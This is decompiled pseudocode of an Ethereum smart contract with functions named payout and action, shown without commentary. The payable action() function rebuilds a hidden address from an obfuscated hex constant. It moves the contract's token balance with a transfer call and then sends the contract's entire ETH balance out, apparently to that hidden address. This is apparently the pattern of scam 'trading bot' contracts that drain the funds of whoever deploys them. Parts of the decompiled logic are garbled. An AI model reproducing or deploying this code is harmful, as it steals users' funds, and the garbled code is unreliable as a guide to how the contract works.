contract main {




// =====================  Runtime code  =====================


array of uint256 sub_e989513c;
array of uint256 sub_f7870ff2;
array of uint256 payout;

function payout() {
    return payout[0 len payout.length]
}

function sub_e989513c(?) {
    return sub_e989513c[0 len sub_e989513c.length]
}

function sub_f7870ff2(?) {
    return sub_f7870ff2[0 len sub_f7870ff2.length]
}

function _fallback() payable {
  stop
}

function sub_ff1670b7(?) {
    mem[96] = 42
    mem[128 len 42] = 0xfe5147344561646261633033343330313838356134353935433345306644663338323046454639356546
    mem[192] = 1
    mem[224] = '0'
    mem[256] = 42
    mem[64] = 352
    mem[288 len 42] = code.data[2736 len 42]
    idx = 0
    while idx < 42:
        require idx < mem[96]
        require idx < mem[256]
        mem[idx + 288 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
        if not idx:
            require 0 < mem[192]
            require idx < mem[256]
            mem[idx + 288 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
        idx = idx + 1
        continue 
    _64 = mem[64]
    mem[64] = mem[64] + 64
    mem[_64] = 1
    mem[_64 + 32] = 'x'
    _69 = mem[96]
    _70 = mem[64]
    mem[mem[64]] = mem[96]
    mem[64] = mem[64] + ceil32(_69) + 32
    if not _69:
        _111 = mem[96]
        idx = 0
        while idx < _111:
            require idx < mem[96]
            require idx < mem[_70]
            mem[idx + _70 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
            if idx == 1:
                require 0 < mem[_64]
                require idx < mem[_70]
                mem[idx + _70 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
            idx = idx + 1
            continue 
    else:
        mem[_70 + 32 len _69] = code.data[2736 len _69]
        _112 = mem[96]
        idx = 0
        while idx < _112:
            require idx < mem[96]
            require idx < mem[_70]
            mem[idx + _70 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
            if idx == 1:
                require 0 < mem[_64]
                require idx < mem[_70]
                mem[idx + _70 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
            idx = idx + 1
            continue 
    idx = 2
    while idx < 42:
        require idx < mem[96]
        require idx + 1 < mem[96]
        idx = idx + 2
        continue 
    return 0
}

function action() payable {
    mem[96] = 42
    mem[128 len 42] = 0xfe5147344561646261633033343330313838356134353935433345306644663338323046454639356546
    mem[192] = 1
    mem[224] = '0'
    mem[256] = 42
    mem[64] = 352
    mem[288 len 42] = code.data[2736 len 42]
    idx = 0
    while idx < 42:
        require idx < mem[96]
        require idx < mem[256]
        mem[idx + 288 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
        if not idx:
            require 0 < mem[192]
            require idx < mem[256]
            mem[idx + 288 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
        idx = idx + 1
        continue 
    _64 = mem[64]
    mem[64] = mem[64] + 64
    mem[_64] = 1
    mem[_64 + 32] = 'x'
    _69 = mem[96]
    _70 = mem[64]
    mem[mem[64]] = mem[96]
    mem[64] = mem[64] + ceil32(_69) + 32
    if not _69:
        _111 = mem[96]
        idx = 0
        while idx < _111:
            require idx < mem[96]
            require idx < mem[_70]
            mem[idx + _70 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
            if idx == 1:
                require 0 < mem[_64]
                require idx < mem[_70]
                mem[idx + _70 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
            idx = idx + 1
            continue 
        idx = 2
        while idx < 42:
            require idx < mem[96]
            require idx + 1 < mem[96]
            idx = idx + 2
            continue 
        require ext_code.size(0xe09fabb73bd3ade0a17ecc321fd13a19e81ce82)
        call 0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82.0x70a08231 with:
             gas gas_remaining wei
            args address(this.address)
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        mem[mem[64] + 4] = 0
        mem[mem[64] + 36] = ext_call.return_data[0]
        require ext_code.size(0xe09fabb73bd3ade0a17ecc321fd13a19e81ce82)
        call 0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82.0xa9059cbb with:
             gas gas_remaining wei
            args 0, ext_call.return_data[0]
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        _205 = mem[64]
        mem[64] = mem[64] + 96
        mem[_205] = 42
        mem[_205 + 32 len 42] = 0xfe5147344561646261633033343330313838356134353935433345306644663338323046454639356546
        _206 = mem[64]
        mem[64] = mem[64] + 64
        mem[_206] = 1
        mem[_206 + 32] = '0'
        _214 = mem[64]
        mem[mem[64]] = 42
        mem[64] = mem[64] + 96
        mem[_214 + 32 len 42] = code.data[2736 len 42]
        idx = 0
        while idx < 42:
            require idx < mem[_205]
            require idx < mem[_214]
            mem[idx + _214 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
            if not idx:
                require 0 < mem[_206]
                require idx < mem[_214]
                mem[idx + _214 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
            idx = idx + 1
            continue 
        _456 = mem[64]
        mem[64] = mem[64] + 64
        mem[_456] = 1
        mem[_456 + 32] = 'x'
        _475 = mem[_205]
        _476 = mem[64]
        mem[mem[64]] = mem[_205]
        mem[64] = mem[64] + ceil32(_475) + 32
        if not _475:
            _643 = mem[_205]
            idx = 0
            while idx < _643:
                require idx < mem[_205]
                require idx < mem[_476]
                mem[idx + _476 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
                if idx == 1:
                    require 0 < mem[_456]
                    require idx < mem[_476]
                    mem[idx + _476 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
                _643 = mem[_205]
                idx = idx + 1
                continue 
        else:
            mem[_476 + 32 len _475] = code.data[2736 len _475]
            _644 = mem[_205]
            idx = 0
            while idx < _644:
                require idx < mem[_205]
                require idx < mem[_476]
                mem[idx + _476 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
                if idx == 1:
                    require 0 < mem[_456]
                    require idx < mem[_476]
                    mem[idx + _476 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
                _644 = mem[_205]
                idx = idx + 1
                continue 
        idx = 2
        while idx < 42:
            require idx < mem[_205]
            require idx + 1 < mem[_205]
            idx = idx + 2
            continue 
    else:
        mem[_70 + 32 len _69] = code.data[2736 len _69]
        _112 = mem[96]
        idx = 0
        while idx < _112:
            require idx < mem[96]
            require idx < mem[_70]
            mem[idx + _70 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
            if idx == 1:
                require 0 < mem[_64]
                require idx < mem[_70]
                mem[idx + _70 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
            idx = idx + 1
            continue 
        idx = 2
        while idx < 42:
            require idx < mem[96]
            require idx + 1 < mem[96]
            idx = idx + 2
            continue 
        require ext_code.size(0xe09fabb73bd3ade0a17ecc321fd13a19e81ce82)
        call 0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82.0x70a08231 with:
             gas gas_remaining wei
            args address(this.address)
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        mem[mem[64] + 4] = 0
        mem[mem[64] + 36] = ext_call.return_data[0]
        require ext_code.size(0xe09fabb73bd3ade0a17ecc321fd13a19e81ce82)
        call 0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82.0xa9059cbb with:
             gas gas_remaining wei
            args 0, ext_call.return_data[0]
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        _207 = mem[64]
        mem[64] = mem[64] + 96
        mem[_207] = 42
        mem[_207 + 32 len 42] = 0xfe5147344561646261633033343330313838356134353935433345306644663338323046454639356546
        _208 = mem[64]
        mem[64] = mem[64] + 64
        mem[_208] = 1
        mem[_208 + 32] = '0'
        _216 = mem[64]
        mem[mem[64]] = 42
        mem[64] = mem[64] + 96
        mem[_216 + 32 len 42] = code.data[2736 len 42]
        idx = 0
        while idx < 42:
            require idx < mem[_207]
            require idx < mem[_216]
            mem[idx + _216 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
            if not idx:
                require 0 < mem[_208]
                require idx < mem[_216]
                mem[idx + _216 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
            idx = idx + 1
            continue 
        _462 = mem[64]
        mem[64] = mem[64] + 64
        mem[_462] = 1
        mem[_462 + 32] = 'x'
        _479 = mem[_207]
        _480 = mem[64]
        mem[mem[64]] = mem[_207]
        mem[64] = mem[64] + ceil32(_479) + 32
        if not _479:
            _647 = mem[_207]
            idx = 0
            while idx < _647:
                require idx < mem[_207]
                require idx < mem[_480]
                mem[idx + _480 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
                if idx == 1:
                    require 0 < mem[_462]
                    require idx < mem[_480]
                    mem[idx + _480 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
                _647 = mem[_207]
                idx = idx + 1
                continue 
        else:
            mem[_480 + 32 len _479] = code.data[2736 len _479]
            _648 = mem[_207]
            idx = 0
            while idx < _648:
                require idx < mem[_207]
                require idx < mem[_480]
                mem[idx + _480 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
                if idx == 1:
                    require 0 < mem[_462]
                    require idx < mem[_480]
                    mem[idx + _480 + 32 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
                _648 = mem[_207]
                idx = idx + 1
                continue 
        idx = 2
        while idx < 42:
            require idx < mem[_207]
            require idx + 1 < mem[_207]
            idx = idx + 2
            continue 
    call 0x0 with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
